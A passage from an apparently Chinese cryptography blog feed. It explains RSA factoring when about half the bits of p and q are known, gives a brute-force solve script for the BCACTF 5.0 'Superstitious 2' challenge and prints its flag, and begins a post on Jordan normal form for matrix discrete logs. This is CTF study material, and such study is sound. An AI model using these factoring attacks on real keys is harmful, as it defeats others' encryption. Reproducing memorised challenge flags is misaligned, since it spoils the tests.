class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">q_known = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">p, q = factor.from_str(n, p_known, q_known)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;q = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行可以得到相同的结果。</p><p>在这种用法中，我们将未知的位设置为-1</p><blockquote><p>注意：虽然适用条件中说已知<span class="math inline">\(p\)</span>和<span class="math inline">\(q\)</span>各50%以上的位就能使用，但是在某次测试中发现<span class="math inline">\(p\)</span>与<span class="math inline">\(q\)</span>均已知50.05%的位的时候其实是用不了的，这种时候就要通过爆破来知道尽可能多的位。</p></blockquote><h2 id="使用例bcactf-5.0-superstitious-2">使用例：[BCACTF 5.0 Superstitious 2]</h2><p>加密代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myGetPrime</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = getRandomNBitInteger(<span class="number">1024</span>) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">1024</span>) - <span class="number">1</span>)//<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(x):</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">p = myGetPrime()</span><br><span class="line">q = myGetPrime()</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">message = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">m = bytes_to_long(message.read())</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;superstitious-2.txt&quot;</span>, <span class="string">&quot;w&quot;</span>).write(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>\ne = <span class="subst">&#123;e&#125;</span>\nc = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以知道<code>((1 &lt;&lt; 1024) - 1)//3</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101</span><br></pre></td></tr></table></figure><p>所以我们可以知道<span class="math inline">\(p\)</span>以及<span class="math inline">\(q\)</span>约半数的位为0，以及最低位为1（因为<span class="math inline">\(p\)</span>,<span class="math inline">\(q\)</span>必为奇数），所以我们将除了最低位的所有1都替换为下划线后通过Cyberchef统计之后可以看到：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202411272325392.png" alt="image-20241127232058419" /><figcaption>image-20241127232058419</figcaption></figure><p>有50.05%的位已知，显然可以利用本文说的方法来进行分解，但是实际操作发现只知道这么多位并不能直接分解<span class="math inline">\(p\)</span>和<span class="math inline">\(q\)</span>，所以我们需要对<span class="math inline">\(p\)</span>进行小范围爆破，所以我们可以通过如下脚本来进行求解：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> factor</span><br><span class="line"></span><br><span class="line">n = <span class="number">550201148354755741271315125069984668413716061796183554308291706476140978529375848655819753667593579308959498512392008673328929157581219035186964125404507736120739215348759388064536447663960474781494820693212364523703341226714116205457869455356277737202439784607342540447463472816215050993875701429638490180199815506308698408730404219351173549572700738532419937183041379726568197333982735249868511771330859806268212026233242635600099895587053175025078998220267857284923478523586874031245098448804533507730432495577952519158565255345194711612376226297640371430160273971165373431548882970946865209008499974693758670929</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">12785320910832143088122342957660384847883123024416376075086619647021969680401296902000223390419402987207599720081750892719692986089224687862496368722454869160470101334513312534671470957897816352186267364039566768347665078311312979099890672319750445450996125821736515659224070277556345919426352317110605563901547710417861311613471239486750428623317970117574821881877688142593093266784366282508041153548993479036139219677970329934829870592931817113498603787339747542136956697591131562660228145606363369396262955676629503331736406313979079546532031753085902491581634604928829965989997727970438591537519511620204387132</span></span><br><span class="line"></span><br><span class="line">binlist = []</span><br><span class="line">s = <span class="string">&quot;_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_01&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">    b = <span class="built_in">bin</span>(x)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    ns = <span class="built_in">list</span>(s)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        ns[<span class="number">2</span>*i] = b[i]</span><br><span class="line">    binlist.append(<span class="string">&quot;&quot;</span>.join(ns))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pknown <span class="keyword">in</span> tqdm.tqdm(binlist):</span><br><span class="line">    ps = factor.from_str(n, pknown, s)</span><br><span class="line">    <span class="keyword">if</span> ps != <span class="literal">None</span>:</span><br><span class="line">        p, q = ps</span><br><span class="line">        phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">        d = inverse(e, phi)</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>在这里，我们通过爆破<span class="math inline">\(p\)</span>的高16位中的8个未知位将<span class="math inline">\(p\)</span>的已知位提升了8位，将补充的位全部置0再进行统计可以看到：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202411272325083.png" alt="image-20241127232521024" /><figcaption>image-20241127232521024</figcaption></figure><p>这时候<span class="math inline">\(p\)</span>的已知部分变成了50.83%，应该可以进行有效分解了。运行脚本之后我们就可以得到flag：</p><blockquote><p>bcactf{l4zy_cHall3nG3_WRITinG_f8b335319e464}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 密码学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>若尔当标准型与矩阵离散对数问题</title>
      <link href="/2024/07/12/%E8%8B%A5%E5%B0%94%E5%BD%93%E6%A0%87%E5%87%86%E5%9E%8B%E4%B8%8E%E7%9F%A9%E9%98%B5%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0%E9%97%AE%E9%A2%98/"/>
      <url>/2024/07/12/%E8%8B%A5%E5%B0%94%E5%BD%93%E6%A0%87%E5%87%86%E5%9E%8B%E4%B8%8E%E7%9F%A9%E9%98%B5%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p><del>想写这篇好久了，一直没空，考完期末水一下</del></p><h2 id="第一部分若尔当标准型概述">第一部分：若尔当标准型概述</h2><blockquote><p>参考资料：《高等代数（第五版）》（北京大学数学系前代数小组 编）:P213-P219,P236-P239</p></blockquote><p><strong>定义：</strong>形为 <span class="math display">\[\pmb{J}(\lambda_0,k)=\left(\begin{matrix}\lambda_0&amp;0&amp;0&amp;\cdots&amp;0&amp;0&amp;0\\1&amp;\lambda_0&amp;0&amp;\cdots&amp;0&amp;0&amp;0\\0&amp;1&amp;\lambda_0&amp;\cdots&amp;0&amp;0&amp;0\\\vdots&amp;\vdots&amp;\vdots&amp; &amp;\vdots&amp;\vdots&amp;\vdots\\0&amp;0&amp;0&amp;\cdots&amp;1&amp;\lambda_0&amp;0\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;1&amp;\lambda_0\end{matrix}\right)_{k×k}\]</span> 的矩阵称为<strong>若尔当块</strong>，其中<span class="math inline">\(\lambda_0\)</span>为复数.由若干个若尔当块组成的准对角矩阵 <span class="math display">\[\pmb{A}=\left(\begin{matrix}\pmb{J}(\lambda_1,k_1)&amp;&amp;&amp;\\&amp;\pmb{J}(\lambda_2,k_2)&amp;&amp;\\&amp;&amp;\ddots&amp;&amp;\\&amp;&amp;&amp;\pmb{J}(\lambda_s,k_s)\end{matrix}\right)\]</span> 称为<strong>若尔当形矩阵</strong>，其中<span class="math inline">\(\lambda_1,\lambda_2,\cdots,\lambda_s\)</span>为复数，有一些可以相同.</p><p>例如矩阵 <span class="math display">\[\pmb{A}=\left(\begin{matrix}1&amp;0&amp;0\\1&amp;1&amp;0\\0&amp;1&amp;1\end{matrix}\right)=\pmb{J}(1,3)\]</span> 为若尔当形矩阵（同时它也是一个若尔当块）.</p><p>下面给出的是跟若尔当形矩阵相关的一个重要结论，也是后面通过若尔当形矩阵解决矩阵离散对数问题的重要理论支撑.</p><p><strong>定理：</strong>每个<span class="math inline">\(n\)</span>阶复矩阵<span class="math inline">\(\pmb{A}\)</span>一定与一个若尔当形矩阵相似.这个若尔当形矩阵除去其中若尔当块的排列顺序外由<span class="math inline">\(\pmb{A}\)</span>唯一确定，我们称该若尔当形矩阵为<span class="math inline">\(\pmb{A}\)</span>的<strong>若尔当标准型</strong>.而若尔当标准型中主对角线上元素为<span class="math inline">\(\pmb{A}\)</span>的所有特征值.</p><p>由上述定理我们可以知道：对于复矩阵<span class="math inline">\(\pmb{A}\)</span>的若尔当标准型<span class="math inline">\(\pmb{J}\)</span>，必存在一可逆矩阵<span class="math inline">\(\pmb{P}\)</span>，使得<span class="math inline">\(\pmb{J}=\pmb{P}^{-1}\pmb{A}\pmb{P}\)</span>.</p><p>实际上，对于上面的若尔当形矩阵： <span class="math display">\[\pmb{A}=\left(\begin{matrix}\pmb{J}(\lambda_1,k_1)&amp;&amp;&amp;\\&amp;\pmb{J}(\lambda_2,k_2)&amp;&amp;\\&amp;&amp;\ddots&amp;&amp;\\&amp;&amp;&amp;\pmb{J}(\lambda_s,k_s)\end{matrix}\right)\]</span> 其转置<span class="math inline">\(\pmb{A}^T\)</span>也可被称为若尔当形矩阵，例如对于矩阵 <span class="math display">\[\pmb{A}=\left(\begin{matrix}1&amp;0&amp;0\\1&amp;1&amp;0\\0&amp;1&amp;1\\\end{matrix}\right)\]</span> 矩阵<span class="math inline">\(\pmb{A}^T=\left(\begin{matrix}1&amp;1&amp;0\\0&amp;1&amp;1\\0&amp;0&amp;1\end{matrix}\right)\)</span>也是若尔当形矩阵.</p><p>下面介绍一种求矩阵的若尔当标准型的方法——通过矩阵的特征值求出其若尔当标准型：</p><p>第一步：对于一矩阵<span class="math inline">\(\pmb{A}_{n×n}\)</span>，求出其特征值<span class="math inline">\(\lambda_1,\lambda_2,\cdots,\lambda_s\)</span>；</p><p>第二步：求出每个特征值的几何重数（相等特征值只需求一次，表示该特征值对应的若尔当块的个数），其中对于特征值<span class="math inline">\(\lambda_i\)</span>，几何重数为<span class="math inline">\(n-r(\lambda_i\pmb{I}-\pmb{A})\)</span></p><p>第三步：求每个特征值对应的若尔当块的最大阶数，即找到特征值<span class="math inline">\(\lambda_i\)</span>对应的一个值<span class="math inline">\(k_i\)</span>，使得<span class="math inline">\(k_i\)</span>为满足<span class="math 